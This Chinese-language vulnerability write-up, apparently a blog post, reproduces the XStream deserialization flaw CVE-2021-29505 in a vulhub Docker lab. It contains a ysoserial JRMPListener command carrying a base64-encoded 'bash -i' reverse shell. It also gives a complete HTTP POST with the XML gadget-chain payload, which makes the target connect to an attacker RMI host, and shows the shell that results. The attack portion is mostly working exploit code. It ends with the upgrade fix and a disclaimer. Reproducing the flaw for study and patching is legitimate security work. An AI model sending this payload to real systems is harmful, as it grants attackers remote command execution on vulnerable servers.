![v2-b38e7280f516ae0181e707ff36e9943a_b.jpg](https://image.3001.net/images/20210525/1621950030_60acfe4e6fd1378c6c4b0.jpg!small)

## 一、简介描述

XStream是一种OXMapping技术，是用来处理XML文件序列化的框架,在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁琐。攻击者可以操纵已处理的输入流并替换或注入对象，从而执行从远程服务器加载的任意代码。

## 二、影响版本：

XStream <= 1.4.16

## 三、环境搭建：

https://raw.githubusercontent.com/vulhub/vulhub/master/xstream/CVE-2021-29505/docker-compose.yml

文件：docker-compose.yml

    
    
    version: '2' services: web: image: vulhub/xstream:1.4.16 ports: - "8080:8080"
    
    docker-compose up -d

![v2-3dbd8548a574de80a69fd3689408ef83_b.jpg](https://image.3001.net/images/20210525/1621950034_60acfe52252c7d3f8a9f5.jpg!small)

镜像已经启动：

![v2-bbc4b9d875b178ade501112accb95ed8_b.jpg](https://image.3001.net/images/20210525/1621950034_60acfe528855cb1214ba8.jpg!small)

访问地址：http://192.168.0.106:8080/

![v2-c623492ad455d1d3ce48f22804d813af_b.jpg](https://image.3001.net/images/20210525/1621950034_60acfe52d4f71793a97a3.jpg!small)

## 四、漏洞复现

启动服务：

反弹目标需要base64加密：

    
    
    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 "bash -c {echo,L2Jpbi9iYxxxxxxxxPiYx}|{base64,-d}|{bash,-i}"

执行过程截图：

![v2-72fae62027447e383fe1b4904f4e345a_b.jpg](https://image.3001.net/images/20210525/1621950035_60acfe5334b6ca1938df4.jpg!small)

执行poc：

![v2-37ab17bfbbe6ec8637b12afbba105ade_b.jpg](https://image.3001.net/images/20210525/1621950035_60acfe538057cd19c2550.jpg!small)

获取反弹shell：

![v2-be3948dcec5f78a532cf60a6a14c034a_b.jpg](https://image.3001.net/images/20210525/1621950035_60acfe53e4cac042b0b4d.jpg!small)

详细数据包：

    
    
    POST / HTTP/1.1 Host: 192.168.0.106:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Type: application/xml Content-Length: 3115 <java.util.PriorityQueue serialization='custom'> <unserializable-parents/> <java.util.PriorityQueue> <default> <size>2</size> </default> <int>3</int> <javax.naming.ldap.Rdn_-RdnEntry> <type>12345</type> <value class='com.sun.org.apache.xpath.internal.objects.XString'> <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj> </value> </javax.naming.ldap.Rdn_-RdnEntry> <javax.naming.ldap.Rdn_-RdnEntry> <type>12345</type> <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'> <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'> <parsedMessage>true</parsedMessage> <soapVersion>SOAP_11</soapVersion> <bodyParts/> <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'> <attachmentsInitialized>false</attachmentsInitialized> <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'> <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'> <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'> <names> <string>aa</string> <string>aa</string> </names> <ctx> <environment/> <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'> <java.rmi.server.RemoteObject> <string>UnicastRef</string> <string>192.168.0.102</string> <int>1098</int> <long>0</long> <int>0</int> <long>0</long> <short>0</short> <boolean>false</boolean> </java.rmi.server.RemoteObject> </registry> <host>192.168.0.102</host> <port>1098</port> </ctx> </candidates> </aliases> </nullIter> </sm> </message> </value> </javax.naming.ldap.Rdn_-RdnEntry> </java.util.PriorityQueue> </java.util.PriorityQueue>

## 五、漏洞修复：

将xstream升级到1.4.17或以上版本。（在maven的/pom.xml中替换高版本xstream）

    
    
    <dependency> <groupId>com.thoughtworks.xstream</groupId> <artifactId>xstream</artifactId> <version>1.4.17</version> </dependency>

参考：

https://mp.weixin.qq.com/s/dh7Ewg7Pp-pg3mkLuUv9Rg

https://blog.csdn.net/weixin_45728976/article/details/116942969

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！![v2-ecdfe0b7f2dd19a1c854653de344b092_b.jpg](https://image.3001.net/images/20210525/1621950036_60acfe54680ae9d3e246b.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![v2-4b029825345899d23992b40ada6b2840_b.jpg](https://image.3001.net/images/20210525/1621950036_60acfe54b151fceb8477e.jpg!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![v2-0d302ca3ab5381e8c1ab1065bf16271a_b.jpg](https://image.3001.net/images/20210525/1621950037_60acfe551e34a53cba942.jpg!small)

